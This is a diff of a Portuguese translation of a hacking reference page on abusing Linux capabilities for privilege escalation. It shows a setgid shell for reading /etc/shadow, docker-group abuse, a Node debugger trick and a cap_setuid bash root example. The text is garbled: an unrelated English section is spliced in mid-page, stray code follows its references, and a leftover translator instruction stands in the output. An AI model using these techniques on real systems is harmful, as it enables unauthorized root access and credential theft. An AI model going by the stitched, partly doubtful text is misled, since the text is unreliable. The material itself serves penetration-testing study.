+Existem muitos arquivos que você pode sobrescrever para escalar privilégios, [você pode obter ideias aqui](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).
 
 **Exemplo com binário**
 
@@ -1292,17 +1286,17 @@ find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
 #Find every file readable by a group in /etc with a maxpath of 1
 find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
 ```
-Uma vez que você encontrou um arquivo que pode ser abusado (por meio de leitura ou escrita) para escalar privilégios, você pode **obter um shell se passando pelo grupo interessante** com:
+Depois de encontrar um arquivo que você possa abusar (lendo ou escrevendo) para escalar privilégios, você pode **obter um shell se passando pelo grupo interessante** com:
 ```python
 import os
 os.setgid(42)
 os.system("/bin/bash")
 ```
-Neste caso, o grupo shadow foi falsificado, então você pode ler o arquivo `/etc/shadow`:
+Neste caso, o grupo shadow foi falsificado para que você possa ler o arquivo `/etc/shadow`:
 ```bash
 cat /etc/shadow
 ```
-Se o **docker** estiver instalado, você pode **se passar pelo grupo docker** e abusar dele para se comunicar com o [**socket do docker** e escalar privilégios](./#writable-docker-socket).
+Se o **docker** estiver instalado, você pode **se passar** pelo **grupo docker** e abusar dele para se comunicar com o [**socket do docker** e escalar privilégios](./#writable-docker-socket).
 
 ## CAP\_SETFCAP
 
@@ -1335,7 +1329,7 @@ status = libcap.cap_set_file(path,cap_t)
 if(status == 0):
     print (cap + " was successfully added to " + path)
 ```
-{% endcode %} (This tag should not be translated)
+{% endcode %} (This is not a text to be translated, it's just a markdown tag)
 ```bash
 python setcapability.py /usr/bin/python2.7
 ```
@@ -1370,10 +1364,10 @@ setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb
 /usr/bin/gdb
 bash: /usr/bin/gdb: Operation not permitted
 ```
-Depois de investigar, li o seguinte: _Permitido: este é um **subconjunto limitante para as capacidades efetivas** que a thread pode assumir. Também é um subconjunto limitante para as capacidades que podem ser adicionadas ao conjunto herdável por uma thread que **não possui a capacidade CAP\_SETPCAP** em seu conjunto efetivo._\
+Depois de investigar, li o seguinte: _Permitido: Este é um **subconjunto limitante para as capacidades efetivas** que a thread pode assumir. Também é um subconjunto limitante para as capacidades que podem ser adicionadas ao conjunto herdável por uma thread que **não possui a capacidade CAP\_SETPCAP** em seu conjunto efetivo._\
 Parece que as capacidades Permitidas limitam aquelas que podem ser usadas.\
 No entanto, o Docker também concede o **CAP\_SETPCAP** por padrão, então você pode ser capaz de **definir novas capacidades dentro das herdáveis**.\
-No entanto, na documentação dessa capacidade: _CAP\_SETPCAP: \[...\] **adicionar qualquer capacidade do conjunto de limites da thread chamadora** ao seu conjunto herdável_.\
+No entanto, na documentação dessa capacidade: _CAP\_SETPCAP: \[...\] **adiciona qualquer capacidade do conjunto de limites da thread chamadora ao seu conjunto herdável**_.\
 Parece que só podemos adicionar ao conjunto herdável as capacidades do conjunto de limites. O que significa que **não podemos colocar novas capacidades como CAP\_SYS\_ADMIN ou CAP\_SYS\_PTRACE no conjunto herdável para escalar privilégios**.
 
 ## CAP\_SYS\_RAWIO
@@ -1403,23 +1397,11 @@ Se você tiver capacidades de kill e houver um **programa node em execução com
 kill -s SIGUSR1 <nodejs-ps>
 # After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
 ```
-{% content-ref url="electron-cef-chromium-debugger-abuse.md" %}
-[electron-cef-chromium-debugger-abuse.md](electron-cef-chromium-debugger-abuse.md)
-{% endcontent-ref %}
-
-​
-
-<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>
-
-​​​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) é o evento de cibersegurança mais relevante na Espanha e um dos mais importantes na Europa. Com a missão de promover o conhecimento técnico, este congresso é um ponto de encontro fervilhante para profissionais de tecnologia e cibersegurança em todas as disciplinas.
-
-{% embed url="https://www.rootedcon.com/" %}
-
-## CAP\_NET\_BIND\_SERVICE
+## CAP_NET_BIND_SERVICE
 
 Isso significa que é possível ouvir em qualquer porta (mesmo em portas privilegiadas). Você não pode escalar privilégios diretamente com essa capacidade.
 
-**Exemplo com binário**
+Exemplo com binário
 
 Se o **`python`** tiver essa capacidade, ele poderá ouvir em qualquer porta e até mesmo se conectar a qualquer outra porta (alguns serviços exigem conexões de portas de privilégios específicos).
 
@@ -1440,54 +1422,56 @@ while True:
 {% tab title="Linux Capabilities" %}
 # Linux Capabilities
 
-Linux Capabilities are a way to split the privileges of a process into smaller pieces. This way, a process can be granted only the privileges it needs to do its job, instead of running with full root privileges.
+Linux capabilities are a way to divide the privileges of a superuser into smaller units. This way, a process can be granted only the specific capabilities it needs to perform its task, instead of running with full root privileges.
 
 ## List Capabilities
 
-To list the capabilities of a process, you can use the `getpcaps` command:
+To list the capabilities of a process, you can use the `getcap` command:
 
 ```bash
-$ getpcaps <pid>
+$ getcap /bin/ping
+/bin/ping = cap_net_raw+ep
 ```
 
-To list the capabilities of a file, you can use the `getcap` command:
-
-```bash
-$ getcap <file>
-```
+This output shows that the `ping` binary has the `cap_net_raw` capability, which allows it to send and receive raw network packets.
 
 ## Add Capabilities
 
-To add capabilities to a file, you can use the `setcap` command:
+To add a capability to a binary, you can use the `setcap` command:
 
 ```bash
-$ setcap <capability> <file>
+$ sudo setcap cap_net_admin+ep /bin/ping
 ```
 
-For example, to add the `CAP_NET_RAW` capability to the `ping` command:
-
-```bash
-$ sudo setcap cap_net_raw+ep /bin/ping
-```
+This command adds the `cap_net_admin` capability to the `ping` binary, which allows it to perform network administration tasks such as setting network interfaces up and down.
 
 ## Remove Capabilities
 
-To remove capabilities from a file, you can use the `setcap` command with the `-r` option:
+To remove a capability from a binary, you can use the `-r` option with the `setcap` command:
 
 ```bash
-$ sudo setcap -r <capability> <file>
+$ sudo setcap -r cap_net_admin /bin/ping
 ```
 
-For example, to remove the `CAP_NET_RAW` capability from the `ping` command:
+This command removes the `cap_net_admin` capability from the `ping` binary.
+
+## Exploiting Capabilities
+
+If a binary has a capability that it doesn't need, it can be exploited to gain elevated privileges. For example, if a binary has the `cap_setuid` capability, an attacker can use it to gain root privileges by setting the UID to 0.
 
 ```bash
-$ sudo setcap -r cap_net_raw /bin/ping
+$ sudo setcap cap_setuid+ep /bin/bash
+$ /bin/bash -p
+# id
+uid=0(root) gid=1000(user) groups=1000(user)
 ```
+
+In this example, the `bash` binary has the `cap_setuid` capability added to it, which allows an attacker to set the UID to 0 and gain root privileges.
 
 ## References
 
 - [Linux Capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html)
-- [Linux Capabilities in Practice](https://www.redhat.com/sysadmin/linux-capabilities-practice)
+- [Understanding Linux Capabilities](https://www.redhat.com/sysadmin/linux-capabilities)
 ```python
 import socket
 s=socket.socket()
@@ -1499,9 +1483,9 @@ s.connect(('10.10.10.10',500))
 
 ## CAP\_NET\_RAW
 
-[**CAP\_NET\_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) permite que um processo seja capaz de **criar tipos de soquetes RAW e PACKET** para os namespaces de rede disponíveis. Isso permite a geração e transmissão arbitrária de pacotes através das interfaces de rede expostas. Em muitos casos, essa interface será um dispositivo Ethernet virtual que pode permitir que um contêiner malicioso ou **comprometido falsifique** **pacotes** em vários níveis de rede. Um processo malicioso ou contêiner comprometido com essa capacidade pode injetar em uma ponte upstream, explorar o roteamento entre contêineres, ignorar os controles de acesso à rede e, de outra forma, interferir na rede do host se um firewall não estiver em vigor para limitar os tipos e conteúdos de pacotes. Finalmente, essa capacidade permite que o processo se vincule a qualquer endereço nos namespaces disponíveis. Essa capacidade é frequentemente retida por contêineres privilegiados para permitir que o ping funcione usando soquetes RAW para criar solicitações ICMP a partir de um contêiner.
+[**CAP\_NET\_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) permite que um processo possa **criar tipos de soquetes RAW e PACKET** para os namespaces de rede disponíveis. Isso permite a geração e transmissão arbitrária de pacotes através das interfaces de rede expostas. Em muitos casos, essa interface será um dispositivo Ethernet virtual que pode permitir que um contêiner malicioso ou **comprometido falsifique** **pacotes** em vários níveis de rede. Um processo malicioso ou contêiner comprometido com essa capacidade pode injetar em uma ponte upstream, explorar o roteamento entre contêineres, ignorar os controles de acesso à rede e, de outra forma, interferir na rede do host se um firewall não estiver em vigor para limitar os tipos e conteúdos de pacotes. Finalmente, essa capacidade permite que o processo se vincule a qualquer endereço nos namespaces disponíveis. Essa capacidade é frequentemente retida por contêineres privilegiados para permitir que o ping funcione usando soquetes RAW para criar solicitações ICMP a partir de um contêiner.
 
-**Isso significa que é possível capturar tráfego.** Você não pode escalar privilégios diretamente com essa capacidade.
+**Isso significa que é possível capturar o tráfego.** Você não pode escalar privilégios diretamente com essa capacidade.
 
 **Exemplo com binário**
 
@@ -1510,11 +1494,11 @@ Se o binário **`tcpdump`** tiver essa capacidade, você poderá usá-lo para ca
 getcap -r / 2>/dev/null
 /usr/sbin/tcpdump = cap_net_raw+ep
 ```
-Note que se o **ambiente** estiver fornecendo essa capacidade, você também pode usar o **`tcpdump`** para capturar o tráfego.
+Observe que se o **ambiente** estiver fornecendo essa capacidade, você também pode usar o **`tcpdump`** para capturar o tráfego.
 
 **Exemplo com binário 2**
 
-O exemplo a seguir é um código em **`python2`** que pode ser útil para interceptar o tráfego da interface "**lo**" (**localhost**). O código é do laboratório "_The Basics: CAP-NET\_BIND + NET\_RAW_" de [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com)
+O exemplo a seguir é um código **`python2`** que pode ser útil para interceptar o tráfego da interface "**lo**" (**localhost**). O código é do laboratório "_The Basics: CAP-NET\_BIND + NET\_RAW_" de [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com)
 ```python
 import socket
 import struct
@@ -1578,11 +1562,11 @@ iptc.easy.flush_table('filter')
 ```
 ## CAP\_LINUX\_IMMUTABLE
 
-**Isso significa que é possível modificar os atributos do inode.** Você não pode escalar privilégios diretamente com essa capacidade.
+Isso significa que é possível modificar os atributos do inode. Você não pode escalar privilégios diretamente com essa capacidade.
 
 **Exemplo com binário**
 
-Se você descobrir que um arquivo é imutável e o python tiver essa capacidade, você pode **remover o atributo imutável e tornar o arquivo modificável:**
+Se você encontrar um arquivo imutável e o python tiver essa capacidade, você pode **remover o atributo imutável e tornar o arquivo modificável:**
 ```python
 #Check that the file is imutable
 lsattr file.sh 
@@ -1643,7 +1627,7 @@ Além disso, essa capacidade também permite que o processo visualize a saída d
 
 É uma capacidade padrão ([https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)).
 
-Essa capacidade permite a escalada de privilégios (por meio da leitura de disco completo) no host, sob as seguintes condições:
+Essa capacidade permite escalonamentos de privilégios (por meio de leitura de disco completo) no host, sob as seguintes condições:
 
 1. Ter acesso inicial ao host (não privilegiado).
 2. Ter acesso inicial ao contêiner (privilegiado (EUID 0) e `CAP_MKNOD` efetivo).
@@ -1651,7 +1635,7 @@ Essa capacidade permite a escalada de privilégios (por meio da leitura de disco
 
 **Passos:**
 
-1. No host, como um usuário padrão:
+1. No host, como usuário padrão:
    1. Obtenha o UID atual (`id`). Por exemplo: `uid=1000(não privilegiado)`.
    2. Obtenha o dispositivo que deseja ler. Por exemplo: `/dev/sda`
 2. No contêiner, como `root`:
@@ -1693,7 +1677,7 @@ Em resumo, `CAP_SETPCAP` permite que um processo modifique os conjuntos de capac
 
 ## Referências
 
-**A maioria desses exemplos foi retirada de alguns laboratórios de** [**https://attackdefense.pentesteracademy.com/**](https://attackdefense.pentesteracademy.com), então se você quiser praticar essas técnicas de privilégios elevados, recomendo esses laboratórios.
+**A maioria desses exemplos foi retirada de alguns laboratórios de** [**https://attackdefense.pentesteracademy.com/**](https://attackdefense.pentesteracademy.com), então se você quiser praticar essas técnicas de privesc, recomendo esses laboratórios.
 
 **Outras referências**:
 
@@ -1716,7 +1700,7 @@ Em resumo, `CAP_SETPCAP` permite que um processo modifique os conjuntos de capac
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Você trabalha em uma **empresa de cibersegurança**? Quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Você trabalha em uma **empresa de cibersegurança**? Quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
 * Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
 * **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
